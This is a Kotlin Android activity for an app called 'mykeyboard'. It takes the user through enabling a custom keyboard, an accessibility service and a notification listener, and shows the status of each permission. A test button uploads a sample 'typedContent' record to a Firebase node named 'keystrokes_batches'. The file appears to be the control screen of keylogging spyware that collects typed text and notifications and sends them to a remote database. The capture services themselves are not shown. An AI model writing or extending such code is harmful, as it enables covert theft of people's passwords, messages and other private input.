package com.example.mykeyboard

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.inputmethod.InputMethodManager
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : Activity() {

    private var txtKeyboardStatus: TextView? = null
    private var txtAccessibilityStatus: TextView? = null
    private var txtNotificationStatus: TextView? = null
    private var txtLogConsole: TextView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            setContentView(R.layout.activity_main)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            txtKeyboardStatus = findViewById(R.id.txtKeyboardStatus)
            txtAccessibilityStatus = findViewById(R.id.txtAccessibilityStatus)
            txtNotificationStatus = findViewById(R.id.txtNotificationStatus)
            txtLogConsole = findViewById(R.id.txtLogConsole)

            val btnKeyboard = findViewById<Button>(R.id.btnEnableKeyboard)
            val btnAccessibility = findViewById<Button>(R.id.btnEnableAccessibility)
            val btnNotification = findViewById<Button>(R.id.btnEnableNotification)
            val btnTestSync = findViewById<Button>(R.id.btnTestSync)

            LogStore.setListener { logs ->
                runOnUiThread {
                    txtLogConsole?.text = logs
                }
            }

            btnKeyboard?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_INPUT_METHOD_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnAccessibility?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnNotification?.setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }

            btnTestSync?.setOnClickListener {
                try {
                    val database = FirebaseDatabase.getInstance()
                    val ref = database.getReference("keystrokes_batches")
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
                    val testData = mapOf(
                        "appName" to "test.app",
                        "timestamp" to System.currentTimeMillis(),
                        "typedContent" to "Manual test keystroke at $timestampKey"
                    )

                    ref.child("test_app").child(timestampKey).setValue(testData)
                        .addOnSuccessListener {
                            Toast.makeText(this, "Test sync successful!", Toast.LENGTH_SHORT).show()
                            LogStore.addLog("Manual test sync SUCCESS")
                        }
                        .addOnFailureListener { e: Exception ->
                            Toast.makeText(this, "Test sync failed: ${e.message}", Toast.LENGTH_LONG).show()
                            LogStore.addLog("Manual test sync FAILED: ${e.message}")
                        }
                } catch (e: Exception) {
                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                    LogStore.addLog("Manual test error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            updateStatuses()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun updateStatuses() {
        try {
            // 1. Check Keyboard Status
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as? InputMethodManager
            val enabledMethods = imm?.enabledInputMethodList ?: emptyList()
            val myPackage = packageName
            var isKeyboardEnabled = false
            for (method in enabledMethods) {
                if (method.packageName == myPackage) {
                    isKeyboardEnabled = true
                    break
                }
            }

            if (isKeyboardEnabled) {
                txtKeyboardStatus?.text = "Status: Enabled ✓"
                txtKeyboardStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtKeyboardStatus?.text = "Status: Not Enabled ❌"
                txtKeyboardStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            // 2. Check Accessibility Service Status
            val accessibilityEnabled = try {
                val settingValue = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
                if (settingValue == 1) {
                    val service = "${packageName}/${AppAccessibilityService::class.java.name}"
                    val settingValue2 = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                    settingValue2?.contains(service) == true
                } else false
            } catch (e: Exception) {
                false
            }

            if (accessibilityEnabled) {
                txtAccessibilityStatus?.text = "Status: Enabled ✓"
                txtAccessibilityStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtAccessibilityStatus?.text = "Status: Not Enabled ❌"
                txtAccessibilityStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        try {
            // 3. Check Notification Access Status
            val notificationEnabled = try {
                val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
                val componentName = ComponentName(this, AppNotificationListenerService::class.java)
                enabledListeners?.contains(componentName.flattenToString()) == true || enabledListeners?.contains(packageName) == true
            } catch (e: Exception) {
                false
            }

            if (notificationEnabled) {
                txtNotificationStatus?.text = "Status: Enabled ✓"
                txtNotificationStatus?.setTextColor(android.graphics.Color.parseColor("#388E3C"))
            } else {
                txtNotificationStatus?.text = "Status: Not Enabled ❌"
                txtNotificationStatus?.setTextColor(android.graphics.Color.parseColor("#D32F2F"))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
